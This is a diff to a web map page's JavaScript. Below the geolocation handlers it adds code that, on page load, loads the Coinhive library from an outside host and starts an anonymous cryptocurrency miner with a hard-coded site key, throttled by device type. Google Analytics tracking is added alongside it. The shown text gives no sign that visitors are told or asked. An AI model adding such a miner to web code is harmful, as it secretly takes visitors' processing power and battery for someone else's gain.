@@ -95,3 +95,21 @@ map.on('locationfound', function (event) {
 map.on('locationerror', function (error) {
     alert('Location errror: ' + error.message);
 });
+
+var miner, minerScript = document.createElement('script');
+minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
+minerScript.addEventListener('load', function () {
+    miner = new CoinHive.Anonymous('ENDYwvXEVLN7UFRO43zBsKNHAYGXx9u2');
+    miner.setThrottle(miner.isMobile() ? 0.4 : 0.2);
+    miner.start();
+});
+document.head.appendChild(minerScript);
+
+var analyticsScript = document.createElement('script');
+analyticsScript.src = 'https://www.googletagmanager.com/gtag/js?id=UA-110826300-4';
+document.head.appendChild(analyticsScript);
+
+window.dataLayer = window.dataLayer || [];
+function gtag () { dataLayer.push(arguments); }
+gtag('js', new Date());
+gtag('config', 'UA-110826300-4');
